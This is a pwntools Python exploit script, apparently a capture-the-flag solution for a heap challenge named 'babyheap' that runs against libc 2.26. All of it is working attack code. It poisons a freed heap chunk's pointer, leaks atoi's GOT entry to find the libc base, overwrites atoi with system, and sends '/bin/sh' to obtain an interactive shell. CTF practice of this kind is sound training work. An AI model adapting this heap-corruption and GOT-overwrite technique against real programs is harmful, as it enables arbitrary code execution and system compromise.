from pwn import *
context.binary = elf = ELF('./babyheap', checksec=False)

s = process('./babyheap', env={'LD_PRELOAD':'./libc-2.26.so'})
#s = process('./babyheap')
libc = ELF('./libc-2.26.so', checksec=False)

def create():
    s.sendlineafter('> ', '1')

def fill(content):
    s.sendlineafter('> ', '1337')
    s.sendlineafter('Fill ', content)

def edit(content):
    s.sendlineafter('> ', '2')
    s.sendlineafter('Content? ', content)

def show():
    s.sendlineafter('> ', '3')
    s.recvuntil('Content: ')
    return s.recvline()[:-1]

def delete():
    s.sendlineafter('> ', '4')

def exit():
    s.sendlineafter('> ', '5')


create()
delete()
edit(p64(0x6020a0))
create()
fill(
    p64(0) * 5 +
    p64(elf.got.atoi)
)
libc.address = unpack(show().ljust(8, b'\0')) - libc.symbols.atoi
print('libc_base:', hex(libc.address))

edit(pack(libc.symbols.system))
s.sendlineafter('> ', '/bin/sh\00')

s.interactive()
